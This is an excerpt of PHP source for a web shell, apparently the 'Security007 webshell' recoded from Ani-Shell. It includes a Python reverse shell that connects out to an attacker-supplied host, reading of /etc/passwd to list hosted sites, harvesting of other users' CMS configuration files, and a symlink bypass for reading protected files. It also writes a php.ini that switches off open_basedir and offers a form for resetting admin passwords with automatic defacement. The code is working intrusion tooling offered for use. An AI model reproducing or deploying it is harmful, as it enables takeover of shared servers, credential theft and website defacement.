...
$ownerEmail 		= "bangladeshcyberwarriors1337@gmail.com"; // use for sending traceback
...
// Google Dork Creater
elseif(isset($_GET['tty'])){
	$cek = (exe('python --help')) ? "<font color=silver>Enabled</font>" : die( "<font color=red>Can't Spawn TTY Shell Python Is Disabled</font>");
	echo "<center><code><h1>PYTHON TTY SHELL</h1></code><form method='POST' >IP : <input type='text' name='ip' placeholder='0.tcp.ngrok.io' > PORT : <input type='text' name='port' placeholder='31337' > <input type='submit' value='Spawn' >";
	$shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"".$_POST['ip']."\",".$_POST['port']."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'";	
	if($_POST['ip']){
		if (exec_all($shell)){
			echo "<code><font color='#00FF00' size='4' ><center>Spawning TTY Shell Done !!, let's see your fucking terminal</font></code></center>";
		}else{
			echo "<code><font color='red' size='4' ><center>Cannot Spawning TTY Shell</font></code></center>";
}
		}
}
...
while($row=readdir($dir)){
	...
	if ($finish)
	{
		echo "http://$row/$file > Done<br><br>";
		}
		}
		}
elseif(isset($_GET['jumping'])){
	($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="red"><b>Error: Safe_mode = On</b></font>');
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) 
{ 
die('<font size="4" color="red" ><b>[-] Error : Cannot Read /etc/passwd</b></font>');
 }
$pub = array();
$users = array();
$conf = array();
...
echo "<code><center><font size='7' color='#00FF00' face='Calibri'>:--Security007 Server Jumping--:</font></center><br>";
echo "<font size='3' color='red'>Total ada ".count($users)." situs</font><br></code>";
foreach ($users as $user)
{
	echo "<font size='3' color='#00FF00'> [+]</font> <font size='3' color='silver'>/home/$user/public_html/</font><br/>";
	} 
echo '</body></html>';
}
		...
		foreach($user_config[1] as $user_cox) {
			...
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					...
					"/home/$user_cox/public_html/cwcus/DB1.cws" => "Criderweb",
					...
					"/home1/$user_cox/public_html/cwcus/DB1.cws" => "Criderweb",
					...
					"/home2/$user_cox/public_html/cwcus/DB1.cws" => "Criderweb",
					...
					"/home3/$user_cox/public_html/cwcus/DB1.cws" => "Criderweb",
...
elseif(isset($_GET['sym404'])){
	echo '<code><font color="#00FF00">
<center>
<h1>BYPASS SYMLINK [404 NOT FOUND] | PROBLEM CYBER TEAM<h1>
<img src=https://image.ibb.co/h2jGPQ/Problem_Cyber_Team.png height="300px" width="300px" ><br><br><br>
<table border="1px">
<tr>
<th>File Target</th>
<th>Save As</th>
...
<tr>
<td>
<font size="5"><form method="post"><input name="dir" value="/home/user/public_html/fileConfig.php" size="45">
</td>
<td><input name="pct" value="" placeholder="BypasSym.txt">
</td>
<th><input name="gas" type="submit" value="Bypass"></tr><table></form><br>';
@error_reporting(0);
@ini_set('display_errors', 0); 
if($_POST['gas']){
rmdir("pct404");mkdir("pct404", 0777);
$dir = $_POST['dir'];
$pct = $_POST['pct'];
system("ln -s ".$dir." pct404/".$pct);
symlink($dir,"pct404/".$pct);
$ht = fopen("pct404/.htaccess", "w");
fwrite($ht,"ReadmeName ".$pct);
echo'<a href="pct404/">Klik Sini</a></code>';
}
}
	...
	if(file_exists('adminer.php')) {
		...
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			...
			echo "<center><font color=red>gagal buat file adminer</font></center>";
					...
					open_basedir = OFF
					allow_url_fopen = On";
					file_put_contents("php.ini",$oke);
					echo "<script>alert('Bypass Disable Function Sukses'); hideAll();</script>";
			...
			<center>
				<center><div id="button"></div>
						...
						<table>
							...
							<tr><td>Server   : <tr><td><input type="text" name="host" placeholder="localhost"></td></tr>
							<tr><td>User     : <tr><td><input type="text" name="username" placeholder="User DB"></td></tr>
							<tr><td>Password : <tr><td><input type="text" name="password" placeholder="Password DB"></td></tr>
							<tr><td>Database : <tr><td><input type="text" name="db" placeholder="Database"></td></tr>
							<tr><td>Prefix   : <tr><td><input type="text" name="dbprefix" placeholder="dbprefix"></td></tr>
							<br>
							<tr><td>New User       : <tr><td><input type="text" name="user_baru" placeholder="Username Baru"></td></tr>
							<tr><td>New Password   : <tr><td><input type="text" name="password_baru" placeholder="Password Baru"></td></tr>
							  <tr><td> Auto Deface : <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                           
                             <tr><td>Text : <tr><td><input type="text" name="nick" placeholder="Hacked By Security007"></td></tr>
							<tr><td><input type="submit" value="Ganti"></td></tr>
						</table>
						*nb: kalo milih y ... silahkan Ganti Form Hacked By Security007 jadi Hacked by Nick_Kalian
			</center></code>
	</body>';
		}
}
		...
		if(is_writable($dir.$file))
		{
			...
			$colorf = '#00FF00';
                ...
                if(is_file($dir.$file))
                {
					?>
                    <tr>
                    <td class="file"><a style="color: <?php echo $colorf?>;" href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
...
<p align="center"><font color="#00FF00"><b>SECURITY007 WEBSHELL RECODED FROM ANI-SHELL</b><br />
<b>Email</b></font><font color="silver"> : defacementsec007@gmail.com</font> <b><font color="#00FF00">facebook</b></font><font color="silver"> : https://facebook.com/defacement.sec<br>
</font><b><font color="#00FF00">Special thank's to</b></font><font color="silver"> : ProblemCyberTeam,IndoXploit,Andela-webshell,Ani-Shell,Indonesian People<br />
</font></p>
</div>
